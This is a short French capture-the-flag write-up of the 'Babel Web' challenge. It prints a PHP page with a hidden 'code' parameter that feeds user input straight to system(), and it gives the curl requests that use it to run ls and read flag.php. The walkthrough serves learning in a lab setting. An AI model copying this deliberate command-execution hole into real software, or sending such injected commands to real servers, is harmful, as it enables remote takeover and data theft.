## Babel Web

Lien: http://challenges2.france-cybersecurity-challenge.fr:5001/

Un simple `curl http://challenges2.france-cybersecurity-challenge.fr:5001/`

Pour s'apercevoir du commentaire qui montre une page, `index.php?source=1`

Le résultat se trouve en une seule ligne, difficile de lire dans le terminal, on ouvre le lien avec un navigateur

`firefox http://challenges2.france-cybersecurity-challenge.fr:5001/?source=1`

D'après le nom du paramètre on se doute que c'est la source de l'`index.php` .

```HTML+PHP
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>
```

Le code récupère la valeur du paramètre `code` pour l'exécuter en tant que commande dans `@system()`

`curl http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?code=ls%20-la`

Ce qui exécute la commande `ls -la` qui permet d'afficher les fichiers cachés (ici il n'y en a pas)

`curl http://challenges2.france-cybersecurity-challenge.fr:5001/?code=cat%20flag.php`

ne marche pas, on peut simplement ouvrir le lien dans un navigateur et regarder la source (Ctrl+U)

`view-source:http://challenges2.france-cybersecurity-challenge.fr:5001/?code=cat%20flag.php`

ou `curl http://challenges2.france-cybersecurity-challenge.fr:5001/?code=head%20flag.php`

`head` une alternative à `cat` pour lire que le début d'un fichier, cette commande permet de lire le fichier via votre terminal avec `curl`.
